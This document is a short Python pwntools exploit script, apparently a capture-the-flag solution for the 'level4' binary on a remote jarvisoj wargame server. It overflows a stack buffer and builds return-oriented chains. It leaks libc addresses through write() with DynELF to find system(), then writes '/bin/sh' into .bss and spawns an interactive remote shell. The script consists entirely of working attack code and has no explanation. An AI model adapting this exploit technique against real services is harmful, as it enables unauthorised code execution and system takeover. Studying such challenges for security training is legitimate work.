from pwn import *
import time
#sh = process('./level4')  # local
sh = remote('pwn2.jarvisoj.com', 9880)  # remote
level4 = ELF('./level4')
# plt
writeplt = level4.plt['write']
readplt = level4.plt['read']
# addr
main = level4.symbols['main']
basebss = level4.bss()
print hex(main), hex(basebss)
pop3ret = 0x08048509
junk = 'a' * 0x88
fakeebp = 'bbbb'
def leak(address):
    payload = junk + fakeebp + \
        p32(writeplt) + p32(pop3ret) + p32(1) + \
        p32(address) + p32(4) + p32(main)
    sh.send(payload)
    data = sh.recv(4)
    print "%#x %s" % (address, data)
    return data
d = DynELF(leak, elf=ELF('./level4'))
systemaddr = d.lookup('system', 'libc')
log.success('leak system address: ' + hex(systemaddr))
payload = junk + fakeebp + p32(readplt) + p32(pop3ret) + p32(0) + p32(
    basebss) + p32(100) + p32(systemaddr) + 'bbbb' + p32(basebss)
sh.send(payload)
sh.send('/bin/sh\x00')
sh.interactive()
